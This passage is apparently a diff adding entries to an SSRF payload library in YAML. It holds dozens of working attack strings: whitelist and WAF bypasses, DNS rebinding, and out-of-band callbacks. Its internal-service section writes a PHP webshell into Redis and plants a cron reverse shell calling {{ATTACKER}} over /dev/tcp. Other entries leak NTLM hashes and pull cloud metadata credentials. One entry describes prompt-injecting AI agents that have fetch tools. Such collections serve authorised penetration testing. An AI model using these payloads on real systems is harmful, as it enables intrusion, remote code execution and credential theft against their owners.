+    category: "protocol_abuse"
+    protocol: "dict"
+    payload: "dict://127.0.0.1:6379/info"
+    description: "DICT protocol sends a line to Redis — returns INFO output."
+    tags: ["protocol", "dict", "redis", "internal-service"]
+    detection: "redis_version in response"
+    severity_hint: "high"
+
+  - id: "proto-015"
+    name: "dict Memcached stats"
+    category: "protocol_abuse"
+    protocol: "dict"
+    payload: "dict://127.0.0.1:11211/stats"
+    description: "DICT protocol to Memcached — returns stats."
+    tags: ["protocol", "dict", "memcached"]
+    severity_hint: "high"
+
+  - id: "proto-016"
+    name: "dict SMTP banner grab"
+    category: "protocol_abuse"
+    protocol: "dict"
+    payload: "dict://127.0.0.1:25/"
+    description: "DICT protocol to SMTP — returns banner."
+    tags: ["protocol", "dict", "smtp", "fingerprint"]
+    severity_hint: "low"
+
+  - id: "proto-017"
+    name: "ftp internal"
+    category: "protocol_abuse"
+    protocol: "ftp"
+    payload: "ftp://127.0.0.1/"
+    description: "FTP fetch from internal server."
+    tags: ["protocol", "ftp"]
+    severity_hint: "medium"
+
+  - id: "proto-018"
+    name: "tftp internal"
+    category: "protocol_abuse"
+    protocol: "tftp"
+    payload: "tftp://127.0.0.1/TESTUDPPACKET"
+    description: >
+      TFTP over UDP — common in network gear and PXE environments.
+      Useful for internal port scanning via response timing.
+    tags: ["protocol", "tftp", "scan"]
+    severity_hint: "medium"
+
+  - id: "proto-019"
+    name: "ldap internal query"
+    category: "protocol_abuse"
+    protocol: "ldap"
+    payload: "ldap://127.0.0.1:389/%0astats%0aquit"
+    description: "LDAP query to internal directory — can enumerate users/objects."
+    tags: ["protocol", "ldap", "enumeration"]
+    severity_hint: "high"
+
+  - id: "proto-020"
+    name: "jar: Java inner URL"
+    category: "protocol_abuse"
+    protocol: "jar"
+    payload: "jar:http://{{ATTACKER}}/evil.jar!/entry"
+    description: >
+      Java jar: scheme — fetches the inner URL and opens an entry.
+      Useful for Java-based SSRF gadgets.
+    tags: ["protocol", "jar", "java"]
+    severity_hint: "medium"
+
+  - id: "proto-021"
+    name: "netdoc Java file read"
+    category: "protocol_abuse"
+    protocol: "netdoc"
+    payload: "netdoc:///etc/passwd"
+    description: "Java netdoc: scheme — reads local files."
+    tags: ["protocol", "netdoc", "java", "lfi"]
+    severity_hint: "high"
+
+  - id: "proto-022"
+    name: "smb UNC path (NTLM leak)"
+    category: "protocol_abuse"
+    protocol: "smb"
+    payload: "smb://{{ATTACKER}}/share/file"
+    description: >
+      Triggers SMB connection — leaks NTLM hashes on Windows targets.
+      Pair with Responder for hash capture.
+    tags: ["protocol", "smb", "ntlm", "windows"]
+    severity_hint: "high"
+
+  - id: "proto-023"
+    name: "data: URI"
+    category: "protocol_abuse"
+    protocol: "data"
+    payload: "data:text/plain,SSRF_TEST"
+    description: "Inline data URI — bypasses 'must have a URL' validators."
+    tags: ["protocol", "data"]
+    severity_hint: "low"
+
+  - id: "proto-024"
+    name: "telnet internal port scan"
+    category: "protocol_abuse"
+    protocol: "telnet"
+    payload: "telnet://127.0.0.1:23/"
+    description: "Telnet to internal port — response timing reveals open ports (CVE-2026-49345)."
+    tags: ["protocol", "telnet", "scan", "2026"]
+    severity_hint: "medium"
+
+  - id: "proto-025"
+    name: "tftp UDP port scan"
+    category: "protocol_abuse"
+    protocol: "tftp"
+    payload: "tftp://127.0.0.1:69/TEST"
+    description: "TFTP UDP probe — internal port scanning via response timing."
+    tags: ["protocol", "tftp", "scan"]
+    severity_hint: "medium"
+
+  # ===========================================================================
+  #  6. WHITELIST BYPASS
+  #     Make the URL look like it goes to the expected host while actually
+  #     routing to the attacker. Includes 2026 parser-differential CVEs.
+  # ===========================================================================
+  - id: "wl-001"
+    name: "Userinfo splitting (classic)"
+    category: "whitelist_bypass"
+    payload: "http://expected-host@{{ATTACKER}}/"
+    description: "Validator reads host as expected-host, HTTP client dials attacker."
+    tags: ["whitelist_bypass", "userinfo", "classic"]
+    severity_hint: "high"
+
+  - id: "wl-002"
+    name: "Reverse userinfo"
+    category: "whitelist_bypass"
+    payload: "http://{{ATTACKER}}@expected-host/"
+    description: "Reverse — validator sees attacker, browser goes to expected."
+    tags: ["whitelist_bypass", "userinfo"]
+    severity_hint: "medium"
+
+  - id: "wl-003"
+    name: "Suffix-match defeat"
+    category: "whitelist_bypass"
+    payload: "http://expected-host.{{ATTACKER}}/"
+    description: "endsWith('expected-host') passes, but authority is attacker."
+    tags: ["whitelist_bypass", "suffix-match"]
+    severity_hint: "high"
+
+  - id: "wl-004"
+    name: "Prefix-match defeat"
+    category: "whitelist_bypass"
+    payload: "http://{{ATTACKER}}?expected-host"
+    description: "startswith('http://expected-host') passes on query confusion."
+    tags: ["whitelist_bypass", "prefix-match"]
+    severity_hint: "high"
+
+  - id: "wl-005"
+    name: "Fragment confusion"
+    category: "whitelist_bypass"
+    payload: "http://{{ATTACKER}}#expected-host"
+    description: >
+      expected-host in fragment — not sent to server, but validator
+      sees it and passes the check.
+    tags: ["whitelist_bypass", "fragment"]
+    severity_hint: "high"
+
+  - id: "wl-006"
+    name: "Backslash authority (CVE-2026-67201)"
+    category: "whitelist_bypass"
+    payload: "http://expected-host\\@{{ATTACKER}}/"
+    description: >
+      Backslash before @ — parser differential between net.urllib
+      and net.http (V language). Check reads expected-host, fetcher
+      reads attacker.
+    tags: ["whitelist_bypass", "backslash", "parser-differential", "2026"]
+    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-67201"]
+    severity_hint: "critical"
+
+  - id: "wl-007"
+    name: "Double @"
+    category: "whitelist_bypass"
+    payload: "http://expected-host@@{{ATTACKER}}/"
+    description: "Double @ — legacy parser confusion."
+    tags: ["whitelist_bypass", "userinfo", "legacy"]
+    severity_hint: "high"
+
+  - id: "wl-008"
+    name: "Percent-encoded @"
+    category: "whitelist_bypass"
+    payload: "http://expected-host%40{{ATTACKER}}/"
+    description: "Percent-encoded @ — some parsers decode, some don't."
+    tags: ["whitelist_bypass", "encoding"]
+    severity_hint: "high"
+
+  - id: "wl-009"
+    name: "Unicode fullwidth @ (U+FF20)"
+    category: "whitelist_bypass"
+    payload: "http://expected-host＠{{ATTACKER}}/"
+    description: >
+      Fullwidth @ (U+FF20) — NFKC-normalising parsers accept it as a
+      delimiter. Validator sees expected-host＠, fetcher normalises to
+      attacker.
+    tags: ["whitelist_bypass", "unicode", "nfkc"]
+    severity_hint: "high"
+
+  - id: "wl-010"
+    name: "Open redirect chain to metadata"
+    category: "whitelist_bypass"
+    payload: "http://{{TARGET}}/redirect?url=http://169.254.169.254/"
+    description: >
+      Uses the target's own open redirect to reach internal metadata.
+      Bypasses SSRF validators that only check the initial URL.
+    tags: ["whitelist_bypass", "redirect-chain"]
+    severity_hint: "critical"
+
+  - id: "wl-011"
+    name: "Redirect chain via attacker"
+    category: "whitelist_bypass"
+    payload: "http://{{ATTACKER}}/redirect?to=http://169.254.169.254/"
+    description: "Attacker-hosted redirect that forwards to metadata."
+    tags: ["whitelist_bypass", "redirect-chain"]
+    severity_hint: "critical"
+
+  - id: "wl-012"
+    name: "DNS rebinding via nip.io"
+    category: "whitelist_bypass"
+    payload: "http://127.0.0.1.nip.io/"
+    description: "nip.io resolves to 127.0.0.1 — bypasses IP string blocklists."
+    tags: ["whitelist_bypass", "dns-rebinding", "nip-io"]
+    severity_hint: "high"
+
+  - id: "wl-013"
+    name: "DNS rebinding via sslip.io"
+    category: "whitelist_bypass"
+    payload: "http://127.0.0.1.sslip.io/"
+    description: "sslip.io resolves to the embedded IP."
+    tags: ["whitelist_bypass", "dns-rebinding", "sslip-io"]
+    severity_hint: "high"
+
+  - id: "wl-014"
+    name: "DNS rebinding via localtest.me"
+    category: "whitelist_bypass"
+    payload: "http://localtest.me/"
+    description: "localtest.me has a public A record for 127.0.0.1."
+    tags: ["whitelist_bypass", "dns-rebinding", "localtest"]
+    severity_hint: "high"
+
+  - id: "wl-015"
+    name: "DNS rebinding via lvh.me"
+    category: "whitelist_bypass"
+    payload: "http://lvh.me/"
+    description: "lvh.me resolves to 127.0.0.1."
+    tags: ["whitelist_bypass", "dns-rebinding", "lvh"]
+    severity_hint: "high"
+
+  - id: "wl-016"
+    name: "DNS rebinding via vcap.me"
+    category: "whitelist_bypass"
+    payload: "http://vcap.me/"
+    description: "vcap.me resolves to 127.0.0.1."
+    tags: ["whitelist_bypass", "dns-rebinding"]
+    severity_hint: "high"
+
+  - id: "wl-017"
+    name: "Unicode whitespace prefix (CVE-2026-50168)"
+    category: "whitelist_bypass"
+    payload: "http://trusted-origin/%C2%A0//{{ATTACKER}}/"
+    description: >
+      NO-BREAK SPACE (U+00A0) prefix — WHATWG URL parser treats it as
+      part of the relative path, but JavaScript String.trim() strips it,
+      converting to protocol-relative //attacker (Angular SSR bypass).
+    tags: ["whitelist_bypass", "unicode", "whitespace", "parser-differential", "2026"]
+    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-50168"]
+    severity_hint: "critical"
+
+  - id: "wl-018"
+    name: "Percent-encoded host (CVE-2026-47076)"
+    category: "whitelist_bypass"
+    payload: "http://expected-host%2e{{ATTACKER}}/"
+    description: >
+      Percent-encoded dot — hackney_url:normalize/2 decodes the host
+      after allowlist validation (CVE-2026-47076).
+    tags: ["whitelist_bypass", "encoding", "parser-differential", "2026"]
+    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-47076"]
+    severity_hint: "high"
+
+  # ===========================================================================
+  #  7. WAF BYPASS
+  #     Bypass regex-based WAFs and normalisation layers.
+  #     Includes CRS bypass and malformed scheme research (2025).
+  # ===========================================================================
+  - id: "waf-001"
+    name: "Malformed scheme (http:)"
+    category: "waf_bypass"
+    payload: "http:169.254.169.254"
+    description: >
+      Omits // after scheme — CRS bypass discovered 2025. WAF sees
+      'http:' but backend resolves to 169.254.169.254.
+    tags: ["waf_bypass", "crs", "2025"]
+    references: ["https://github.com/coreruleset/coreruleset/issues/4384"]
+    severity_hint: "critical"
+
+  - id: "waf-002"
+    name: "Malformed scheme (https:)"
+    category: "waf_bypass"
+    payload: "https:169.254.169.254"
+    description: "Same as above with HTTPS."
+    tags: ["waf_bypass", "crs", "2025"]
+    severity_hint: "critical"
+
+  - id: "waf-003"
+    name: "Double-URL-encoded host"
+    category: "waf_bypass"
+    payload: "http://%256c%256f%2563%2561%256c%2568%256f%2573%2574/"
+    description: "Double-encoded 'localhost' — WAF decodes once, backend decodes again."
+    tags: ["waf_bypass", "encoding", "double-url"]
+    severity_hint: "high"
+
+  - id: "waf-004"
+    name: "Triple-URL-encoded host"
+    category: "waf_bypass"
+    payload: >
+      http://%25256c%25256f%252563%252561%25256c%252568%25256f%252573%252574/
+    description: "Triple-encoded — for parsers that decode multiple times."
+    tags: ["waf_bypass", "encoding", "triple-url"]
+    severity_hint: "high"
+
+  - id: "waf-005"
+    name: "Unicode hostname dots"
+    category: "waf_bypass"
+    payload: "http://127。0。0。1/"
+    description: "U+3002 ideographic full stop — NFKC normalises to ."
+    tags: ["waf_bypass", "unicode", "nfkc"]
+    severity_hint: "high"
+
+  - id: "waf-006"
+    name: "Tab in URL path"
+    category: "waf_bypass"
+    payload: "http://127.0.0.1\t/"
+    description: "Tab character — some parsers strip it, WAF may not."
+    tags: ["waf_bypass", "whitespace"]
+    severity_hint: "medium"
+
+  - id: "waf-007"
+    name: "Newline in URL path"
+    category: "waf_bypass"
+    payload: "http://127.0.0.1\n/"
+    description: "Newline in URL — parser differential."
+    tags: ["waf_bypass", "whitespace"]
+    severity_hint: "medium"
+
+  - id: "waf-008"
+    name: "CR in URL path"
+    category: "waf_bypass"
+    payload: "http://127.0.0.1\r/"
+    description: "CR character."
+    tags: ["waf_bypass", "whitespace"]
+    severity_hint: "medium"
+
+  - id: "waf-009"
+    name: "Nested protocol"
+    category: "waf_bypass"
+    payload: "http://{{ATTACKER}}/http://169.254.169.254/"
+    description: >
+      Nested scheme — WAF sees first URL, backend follows the second.
+      Effective against WAFs that only inspect the first URL.
+    tags: ["waf_bypass", "nested"]
+    severity_hint: "high"
+
+  - id: "waf-010"
+    name: "Angle bracket host"
+    category: "waf_bypass"
+    payload: "http://<127.0.0.1>/"
+    description: "Angle brackets around host — some parsers strip them."
+    tags: ["waf_bypass", "legacy"]
+    severity_hint: "medium"
+
+  - id: "waf-011"
+    name: "Square bracket IPv4-in-IPv6"
+    category: "waf_bypass"
+    payload: "http://[127.0.0.1]/"
+    description: "IPv4 in IPv6 brackets — parser confusion."
+    tags: ["waf_bypass", "ipv6"]
+    severity_hint: "high"
+
+  - id: "waf-012"
+    name: "Backslash scheme (Windows)"
+    category: "waf_bypass"
+    payload: "http:\\\\127.0.0.1\\"
+    description: "Windows-style backslash URL — normalised to // by Windows parsers."
+    tags: ["waf_bypass", "backslash", "windows"]
+    severity_hint: "high"
+
+  - id: "waf-013"
+    name: "ASCII control character in authority"
+    category: "waf_bypass"
+    payload: "http://127.0.0.1%00.example.com/"
+    description: >
+      NUL byte in authority — urllib.parse and underlying HTTP client
+      disagree on host extraction (PraisonAI SSRF bypass).
+    tags: ["waf_bypass", "null-byte", "parser-differential", "2026"]
+    severity_hint: "high"
+
+  - id: "waf-014"
+    name: "CRLF in authority"
+    category: "waf_bypass"
+    payload: "http://127.0.0.1%0d%0aX-Injected: header/"
+    description: "CRLF in authority — HTTP request smuggling / header injection."
+    tags: ["waf_bypass", "crlf", "smuggling", "2026"]
+    severity_hint: "critical"
+
+  # ===========================================================================
+  #  8. DNS REBINDING
+  #     TOCTOU attacks where a hostname resolves to a safe IP during
+  #     validation, then to an internal IP during the actual request.
+  # ===========================================================================
+  - id: "dns-001"
+    name: "DNS rebinding canary"
+    category: "dns_rebinding"
+    payload: "http://{{COLLAB}}/"
+    description: >
+      Basic rebinding canary — confirm DNS resolution reaches your
+      listener. If the target resolves the domain, you see the callback.
+    tags: ["dns_rebinding", "canary"]
+    severity_hint: "high"
+
+  - id: "dns-002"
+    name: "DNS rebinding with fast-flux"
+    category: "dns_rebinding"
+    payload: "http://{{COLLAB}}/"
+    description: >
+      Configure your DNS to alternate between a public IP and 127.0.0.1
+      with TTL=0. Validator resolves public, fetcher resolves loopback.
+    tags: ["dns_rebinding", "toctou"]
+    severity_hint: "high"
+
+  - id: "dns-003"
+    name: "Redirect + rebinding chain"
+    category: "dns_rebinding"
+    payload: "http://{{ATTACKER}}/r?to=http://{{COLLAB}}/"
+    description: >
+      Initial redirect passes validation (public attacker), then
+      rebinding resolves to internal IP (CVE-2026-85673 class).
+    tags: ["dns_rebinding", "redirect-chain", "2026"]
+    references: ["https://www.ionix.io/blog/cve-2026-85673/"]
+    severity_hint: "critical"
+
+  - id: "dns-004"
+    name: "DNS pinning bypass"
+    category: "dns_rebinding"
+    payload: "http://{{COLLAB}}/"
+    description: >
+      Targets apps that resolve once and pin — force a second resolution
+      to a different IP.
+    tags: ["dns_rebinding", "dns-pinning", "2026"]
+    severity_hint: "high"
+
+  - id: "dns-005"
+    name: "rbndr.us rebinding payload"
+    category: "dns_rebinding"
+    payload: "http://make-127.0.0.1-169.254.169.254-rbndr.us/"
+    description: >
+      rbndr.us service — alternates between two IPs. First response
+      returns 127.0.0.1 (passes validation), second returns 169.254.169.254
+      (metadata endpoint).
+    tags: ["dns_rebinding", "rbndr", "2026"]
+    severity_hint: "critical"
+
+  # ===========================================================================
+  #  9. BLIND SSRF / OUT-OF-BAND
+  #     No response reflected. Detect via DNS, HTTP, or timing side-channels.
+  #     Uses the new oast.beardedviking.org infrastructure.
+  # ===========================================================================
+  - id: "blind-001"
+    name: "Basic HTTP callback"
+    category: "blind_oob"
+    payload: "http://{{OOB}}/"
+    description: >
+      Server-side fetch generates an HTTP hit on the OOB receiver.
+      Token in the path confirms which payload fired.
+    tags: ["blind", "oob", "http"]
+    detection: "Token appears in check.php?list=1"
+    severity_hint: "confirmed"
+
+  - id: "blind-002"
+    name: "DNS-only callback"
+    category: "blind_oob"
+    payload: "http://{{OOB_HOST}}/"
+    description: >
+      DNS lookup only — works when HTTP egress is firewalled but
+      DNS resolution still occurs.
+    tags: ["blind", "oob", "dns"]
+    detection: "DNS resolution observed on OAST receiver"
+    severity_hint: "confirmed"
+
+  - id: "blind-003"
+    name: "Unsupported-scheme DNS leak"
+    category: "blind_oob"
+    payload: "gopher://{{OOB_HOST}}:9999/"
+    description: >
+      Some HTTP clients resolve DNS before realising they cannot speak
+      gopher. DNS query leaks even though the connection fails.
+    tags: ["blind", "oob", "dns-leak"]
+    severity_hint: "high"
+
+  - id: "blind-004"
+    name: "Timing-based open port probe"
+    category: "blind_oob"
+    payload: "http://127.0.0.1:22/"
+    description: >
+      Open ports return quickly (banner/RST); closed ports hang until
+      timeout. Compare against baseline port 81.
+    tags: ["blind", "timing"]
+    severity_hint: "medium"
+
+  - id: "blind-005"
+    name: "Timing-based closed port baseline"
+    category: "blind_oob"
+    payload: "http://127.0.0.1:81/"
+    description: "Pair with blind-004 for a baseline delta."
+    tags: ["blind", "timing", "baseline"]
+    severity_hint: "low"
+
+  - id: "blind-006"
+    name: "HTTP callback with unique path"
+    category: "blind_oob"
+    payload: "http://{{OOB}}/huginn-{{RANDOM}}"
+    description: >
+      Unique path per request — correlates the callback to the exact
+      injection point via check.php?token=<hex>.
+    tags: ["blind", "oob", "correlation"]
+    severity_hint: "confirmed"
+
+  - id: "blind-007"
+    name: "Redirect-loop OOB chain"
+    category: "blind_oob"
+    payload: "http://{{OOB}}/r?to=http://{{OOB}}/r?to=http://{{OOB}}/"
+    description: >
+      Infinite redirect loop forces validation to time out, then the
+      final request reaches OOB (Encod3d-Sec TORCH technique).
+    tags: ["blind", "oob", "redirect-loop", "2026"]
+    severity_hint: "confirmed"
+
+  # ===========================================================================
+  #  10. MODERN (2025 / 2026)
+  #      Recent research on parser differentials, IPv6 transition addresses,
+  #      Unicode whitespace, HTTP/2 authority confusion, and framework
+  #      bypasses.
+  # ===========================================================================
+  - id: "modern-001"
+    name: "Double-port parser differential (Angular SSR)"
+    category: "modern"
+    payload: "http://{{ATTACKER}}:80:80/path"
+    description: >
+      WHATWG URL.canParse returns false, Domino resolves to attacker:80.
+      Bypasses Angular SSR host allowlist (CVE-2026-50168).
+    tags: ["modern", "parser-differential", "angular", "2026"]
+    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-50168"]
+    severity_hint: "critical"
+
+  - id: "modern-002"
+    name: "IPv6 NAT64 transition bypass"
+    category: "modern"
+    payload: "http://[64:ff9b::7f00:1]:8080/"
+    description: >
+      NAT64 prefix mapping to 127.0.0.1 — bypasses IPv4-only blocklists.
+      Active in CVE-2026-32594, CVE-2026-81678, CVE-2026-53754.
+    tags: ["modern", "ipv6", "nat64", "2026"]
+    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-32594"]
+    severity_hint: "critical"
+
+  - id: "modern-003"
+    name: "Double-URL-encoding whitelist bypass"
+    category: "modern"
+    payload: "http://expected-host%2540{{ATTACKER}}/"
+    description: >
+      Validator decodes once (sees expected-host), backend decodes twice
+      (sees attacker). Common in CRS bypass research.
+    tags: ["modern", "encoding", "double-url", "2025"]
+    severity_hint: "high"
+
+  - id: "modern-004"
+    name: "Port-confusion parser differential"
+    category: "modern"
+    payload: "http://{{ATTACKER}}:443:80/"
+    description: "Some parsers use 443, others 80 — TLS vs plaintext confusion."
+    tags: ["modern", "parser-differential", "port", "2026"]
+    severity_hint: "high"
+
+  - id: "modern-005"
+    name: "Unicode fullwidth digits"
+    category: "modern"
+    payload: "http://１２７.０.０.１/"
+    description: "Fullwidth digits — NFKC normalises to 127.0.0.1."
+    tags: ["modern", "unicode", "nfkc", "2026"]
+    severity_hint: "high"
+
+  - id: "modern-006"
+    name: "Trailing-dot DNS bypass"
+    category: "modern"
+    payload: "http://169.254.169.254./"
+    description: >
+      Trailing dot after IP — some resolvers still resolve, some
+      blocklists reject the non-canonical form.
+    tags: ["modern", "dns", "trailing-dot", "2025"]
+    severity_hint: "high"
+
+  - id: "modern-007"
+    name: "Redirect-loop DoS bypass"
+    category: "modern"
+    payload: "http://{{ATTACKER}}/r?to=http://{{ATTACKER}}/r?to=..."
+    description: >
+      Infinite redirect loop forces validation to time out and pass
+      the request through.
+    tags: ["modern", "redirect-loop", "2025"]
+    references: ["https://github.com/Encod3d-Sec/TORCH"]
+    severity_hint: "high"
+
+  - id: "modern-008"
+    name: "JSON body SSRF via $ne"
+    category: "modern"
+    payload: '{"url": {"$ne": "invalid"}}'
+    description: >
+      NoSQL operator injection chained into SSRF — framework passes
+      the operator to the fetch URL.
+    tags: ["modern", "json", "nosql", "2026"]
+    severity_hint: "high"
+
+  - id: "modern-009"
+    name: "GraphQL directive SSRF"
+    category: "modern"
+    payload: '{"query": "query { fetch(url: \"http://169.254.169.254/latest/meta-data/\") { content } }"}'
+    description: "GraphQL query variable delivers SSRF to a backend fetcher."
+    tags: ["modern", "graphql", "2026"]
+    severity_hint: "critical"
+
+  - id: "modern-010"
+    name: "HTTP/2 authority confusion"
+    category: "modern"
+    payload: "http://{{ATTACKER}}/ (with :authority: 169.254.169.254)"
+    description: >
+      HTTP/2-to-HTTP/1.1 downgrade with authority override. PortSwigger
+      Top 10 2025 parser differentials class.
+    tags: ["modern", "http2", "parser-differential", "2026"]
+    severity_hint: "critical"
+
+  - id: "modern-011"
+    name: "AI/LLM tool-call SSRF"
+    category: "modern"
+    payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+    description: >
+      Prompt injection into an AI agent that has a URL-fetch tool —
+      chains SSRF via the LLM. Active research area 2026.
+    tags: ["modern", "ai", "llm", "2026"]
+    severity_hint: "critical"
+
+  - id: "modern-012"
+    name: "Service worker scope escape"
+    category: "modern"
+    payload: "https://{{ATTACKER}}/sw.js"
+    description: >
+      Redirect to attacker-hosted service worker — chains with
+      client-side fetch SSRF.
+    tags: ["modern", "service-worker", "2026"]
+    severity_hint: "high"
+
+  - id: "modern-013"
+    name: "gRPC/Protobuf URL field"
+    category: "modern"
+    payload: 'url: "http://169.254.169.254/latest/meta-data/"'
+    description: >
+      SSRF delivered through a gRPC Protobuf field — WAFs rarely parse
+      binary bodies.
+    tags: ["modern", "grpc", "protobuf", "2026"]
+    severity_hint: "critical"
+
+  - id: "modern-014"
+    name: "Cloudflare Workers fetch SSRF"
+    category: "modern"
+    payload: "http://169.254.169.254/latest/meta-data/"
+    description: >
+      Cloudflare Workers can fetch internal addresses unless explicitly
+      blocked — target edge functions.
+    tags: ["modern", "cloudflare", "edge", "2026"]
+    severity_hint: "critical"
+
+  - id: "modern-015"
+    name: "Deno/Node undici backslash bypass"
+    category: "modern"
+    payload: "http:\\\\169.254.169.254\\"
+    description: >
+      Undici's URL parser accepts backslashes as slashes — bypasses
+      regex validators that don't normalise backslashes.
+    tags: ["modern", "node", "undici", "2025"]
+    severity_hint: "high"
+
+  - id: "modern-016"
+    name: "IPv4-compatible IPv6 (Pydantic AI bypass)"
+    category: "modern"
+    payload: "http://[::127.0.0.1]/"
+    description: >
+      IPv4-compatible IPv6 form — less common than IPv4-mapped, but
+      still bypasses some blocklists (Pydantic AI force_download bypass).
+    tags: ["modern", "ipv6", "parser-differential", "2026"]
+    severity_hint: "critical"
+
+  - id: "modern-017"
+    name: "Unicode whitespace origin bypass"
+    category: "modern"
+    payload: "http://trusted-origin/%C2%A0//{{ATTACKER}}/"
+    description: >
+      NO-BREAK SPACE prefix — WHATWG parser treats it as relative path,
+      JavaScript trim() strips it, converting to protocol-relative.
+      Angular SSR CVE-2026-50168.
+    tags: ["modern", "unicode", "whitespace", "angular", "2026"]
+    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-50168"]
+    severity_hint: "critical"
+
+  # ===========================================================================
+  #  11. INTERNAL SERVICE EXPLOITATION
+  #      Once SSRF is confirmed, these payloads pivot into RCE or data theft.
+  # ===========================================================================
+  - id: "svc-001"
+    name: "Redis CONFIG SET dir + webshell"
+    category: "internal_service"
+    service: "redis"
+    payload: >
+      gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASET%20shell%20%22%3C%3Fphp%20system(%24_GET%5B%27c%27%5D)%3B%20%3F%3E%22%0D%0ASAVE%0D%0A
+    description: "Writes a PHP webshell via Redis — full RCE."
+    tags: ["internal_service", "redis", "rce"]
+    severity_hint: "critical"
+
+  - id: "svc-002"
+    name: "Redis cron injection (reverse shell)"
+    category: "internal_service"
+    service: "redis"
+    payload: >
+      gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/spool/cron/%0D%0ACONFIG%20SET%20dbfilename%20root%0D%0ASET%20x%20%22%0A*%20*%20*%20*%20*%20bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/{{ATTACKER}}/4444%200%3E%261%27%0A%22%0D%0ASAVE%0D%0A
+    description: >
+      Writes a cron job that calls back to the attacker — RCE without
+      webshell. Requires Redis to have write access to /var/spool/cron/.
+    tags: ["internal_service", "redis", "rce", "cron"]
+    severity_hint: "critical"
+
+  - id: "svc-003"
+    name: "Memcached session poison"
+    category: "internal_service"
+    service: "memcached"
+    payload: "gopher://127.0.0.1:11211/_set%20session:admin%200%20900%204%0D%0Aevil%0D%0A"
+    description: "Poisons a session store — privilege escalation via session fixation."
+    tags: ["internal_service", "memcached", "session"]
+    severity_hint: "high"
+
+  - id: "svc-004"
+    name: "FastCGI PHP-FPM RCE"
+    category: "internal_service"
+    service: "fastcgi"
+    payload: >
+      gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%2Ffcgi%20%2F%20php%0D%0A...
+    description: >
+      Crafts a FastCGI record to PHP-FPM — chains SSRF to RCE.
+      Requires knowledge of a PHP file on the target.
+    tags: ["internal_service", "fastcgi", "rce"]
+    severity_hint: "critical"
+
+  - id: "svc-005"
+    name: "MySQL LOAD_FILE (fingerprint)"
+    category: "internal_service"
+    service: "mysql"
+    payload: "gopher://127.0.0.1:3306/_"
+    description: "Partial MySQL protocol — fingerprint only; full exploitation requires auth."
+    tags: ["internal_service", "mysql", "fingerprint"]
+    severity_hint: "low"
+
+  - id: "svc-006"
+    name: "PostgreSQL handshake (fingerprint)"
+    category: "internal_service"
+    service: "postgresql"
+    payload: "gopher://127.0.0.1:5432/_"
+    description: "Partial PostgreSQL protocol — fingerprint only."
+    tags: ["internal_service", "postgresql", "fingerprint"]
+    severity_hint: "low"
+
+  - id: "svc-007"
+    name: "Zabbix agent command execution"
+    category: "internal_service"
+    service: "zabbix"
+    payload: "gopher://127.0.0.1:10050/_"
+    description: >
+      Zabbix agent — if EnableRemoteCommands=1, can run shell commands
+      via SSRF.
+    tags: ["internal_service", "zabbix", "rce"]
+    severity_hint: "critical"
+
+  - id: "svc-008"
+    name: "Elasticsearch index listing"
+    category: "internal_service"
+    service: "elasticsearch"
+    payload: "http://127.0.0.1:9200/_cat/indices"
+    description: "Unauthenticated Elasticsearch — lists all indices."
+    tags: ["internal_service", "elasticsearch", "data-theft"]
+    severity_hint: "high"
+
+  - id: "svc-009"
+    name: "Docker API container listing"
+    category: "internal_service"
+    service: "docker"
+    payload: "http://127.0.0.1:2375/containers/json"
+    description: "Unauthenticated Docker API — full container control."
+    tags: ["internal_service", "docker", "rce"]
+    severity_hint: "critical"
+
+  - id: "svc-010"
+    name: "Kubernetes API pod listing"
+    category: "internal_service"
+    service: "kubernetes"
+    payload: "https://kubernetes.default.svc/api/v1/namespaces/default/pods"
+    description: "Kubernetes API — lists pods if SA token has permissions."
+    tags: ["internal_service", "kubernetes"]
+    severity_hint: "critical"
+
+  - id: "svc-011"
+    name: "MongoDB wire protocol probe"
+    category: "internal_service"
+    service: "mongodb"
+    payload: "gopher://127.0.0.1:27017/_"
+    description: "MongoDB wire protocol — fingerprint only via handshake."
+    tags: ["internal_service", "mongodb", "fingerprint"]
+    severity_hint: "low"
+
+  - id: "svc-012"
+    name: "CouchDB database listing"
+    category: "internal_service"
+    service: "couchdb"
+    payload: "http://127.0.0.1:5984/_all_dbs"
+    description: "CouchDB — lists all databases if admin party is enabled."
+    tags: ["internal_service", "couchdb", "data-theft"]
+    severity_hint: "high"
+
+  # ===========================================================================
+  #  12. LEGACY (1990s – 2000s)
+  #      Syntax quirks that occasionally still land.
+  # ===========================================================================
+  - id: "legacy-001"
+    name: "Null byte truncation"
+    category: "legacy"
+    payload: "http://127.0.0.1%00.example.com/"
+    description: "Null byte truncates hostname validation in C-based parsers."
+    tags: ["legacy", "null-byte"]
+    severity_hint: "medium"
+
+  - id: "legacy-002"
+    name: "Gopher SMTP (classic)"
+    category: "legacy"
+    payload: "gopher://127.0.0.1:25/_HELO%20localhost%250D%250A"
+    description: "Classic gopher SMTP payload from the 2000s."
+    tags: ["legacy", "gopher", "smtp"]
+    severity_hint: "medium"
+
+  - id: "legacy-003"
+    name: "Gopher Redis (classic)"
+    category: "legacy"
+    payload: "gopher://127.0.0.1:6379/_INFO%0D%0A"
+    description: "Classic gopher Redis INFO payload."
+    tags: ["legacy", "gopher", "redis"]
+    severity_hint: "high"
+
+  - id: "legacy-004"
+    name: "dict:// SSH banner grab"
+    category: "legacy"
+    payload: "dict://127.0.0.1:22/"
+    description: "DICT protocol to SSH — returns banner."
+    tags: ["legacy", "dict", "ssh"]
+    severity_hint: "low"
+
+  - id: "legacy-005"
+    name: "file:// Windows UNC path"
+    category: "legacy"
+    payload: "file:////{{ATTACKER}}/share/file"
+    description: "Windows UNC path via file:// — leaks NTLM hashes."
+    tags: ["legacy", "file", "unc", "windows"]
+    severity_hint: "high"
+
+  - id: "legacy-006"
+    name: "http:// with leading whitespace"
+    category: "legacy"
+    payload: "    http://127.0.0.1/"
